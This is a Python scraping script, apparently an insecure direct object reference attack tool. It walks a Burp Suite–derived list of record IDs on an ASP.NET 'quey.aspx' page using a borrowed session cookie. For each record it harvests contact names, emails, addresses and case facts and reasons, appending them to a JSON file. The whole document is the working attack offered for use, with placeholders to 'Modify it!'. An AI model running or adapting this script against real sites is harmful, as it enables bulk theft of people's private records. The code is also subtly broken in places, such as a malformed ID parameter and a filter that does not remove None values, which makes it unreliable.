import requests
import random
import json
from bs4 import BeautifulSoup


HackListFromBurpSuit = [
 # Modify it!
]


def genUniqueNumber(count, range_start=0, range_end=999999):
    return random.sample(range(range_start, range_end), count)


def httpGetResponse(url=None,Headers=None):

    response = requests.get(url, headers=Headers, allow_redirects=True)
    return response

def extractValuableInfo(response): #Module Program
    extracted_info = {}
    soupParser = BeautifulSoup(response.text,'html.parser')
    
    def extract_text_by_id(tag, element_id):
        element = soupParser.find(tag, id=element_id)
        return element.text.strip() if element else None

    def extract_input_value_by_id(element_id):
        element = soupParser.find('input', id=element_id)
        return element.get('value', '').strip() if element else None

    def extract_selected_option_text(select_id):
        select_element = soupParser.find('select', id=select_id)
        if select_element:
            selected_option = select_element.find('option', selected=True)
            return selected_option.text.strip() if selected_option else None
        return None
    # Extracting agency information

    ###### Main Key (UserFound) ######
    contact_person = extract_text_by_id('span', 'ContentPlaceHolder1_lblContactPerson')
    if contact_person:
        extracted_info[contact_person] = {}
        extracted_info = extracted_info[contact_person]

        extracted_info['agency_name'] = extract_text_by_id('span', 'ContentPlaceHolder1_lblOrgName')
        extracted_info['agency_code'] = extract_text_by_id('span', 'ContentPlaceHolder1_lblOrgCode')
        extracted_info['agency_type'] = extract_text_by_id('span', 'ContentPlaceHolder1_lblOrgTypeC')
        extracted_info['contact_email'] = extract_input_value_by_id('ContentPlaceHolder1_txtContactEmail')

        # Extracting address information
        extracted_info['city'] = extract_selected_option_text('ContentPlaceHolder1_ddlCity5')
        extracted_info['area'] = extract_selected_option_text('ContentPlaceHolder1_ddlArea5')
        extracted_info['address'] = extract_input_value_by_id('ContentPlaceHolder1_txtOrgAddress')

        # Extracting case information
        case_type_input = soupParser.find('input', id='ContentPlaceHolder1_rblCaseType_0', checked=True)
        if case_type_input:
            case_label = soupParser.find('label', {'for': case_type_input.get('id')})
            extracted_info['case_type'] = case_label.text.strip() if case_label else None
        
        extracted_info['event_category'] = extract_selected_option_text('ContentPlaceHolder1_ddlPtcType')
        extracted_info['event_subtype'] = extract_selected_option_text('ContentPlaceHolder1_ddlPtcSubType')
        extracted_info['subject'] = extract_input_value_by_id('ContentPlaceHolder1_txtSubject')

        # Extracting personnel attribute
        extracted_info['staff_type'] = extract_selected_option_text('ContentPlaceHolder1_ddlStaffType')

        # Extracting additional information
        extracted_info['request'] = extract_text_by_id('textarea', 'ContentPlaceHolder1_txtRequest')
        extracted_info['fact'] = extract_text_by_id('textarea', 'ContentPlaceHolder1_txtFact')
        extracted_info['reason'] = extract_text_by_id('textarea', 'ContentPlaceHolder1_txtReason')
        
        # Remove any None values from the dictionary
        extracted_info = {key: value for key, value in extracted_info.items()}
        
        writeInfo_to_file_UTF8(contact_person, extracted_info)

        return {contact_person: extracted_info} 

def writeInfo_to_file_UTF8(MainKeyValue, extracted_info, file_name="info.json"):

    data = {"Main Key": MainKeyValue, "details": extracted_info}
    with open(file_name, "a",encoding="utf-8") as file:
        json.dump(data, file, ensure_ascii=False, indent=4)
        file.write(",\n")

url = "https://Hacker/quey.aspx?ID=159490"
Headers = {'Cookie':'HackerCookie'} # Modify it!

for i in HackListFromBurpSuit:
    # uNum = genUniqueNumber(1)[0] # For Fuzzing! Test
    url = f"https://Hacker/quey.aspx?ID=159490ID={i}" # Modify it!
   
    info = extractValuableInfo(httpGetResponse(url,Headers))
    print(info)




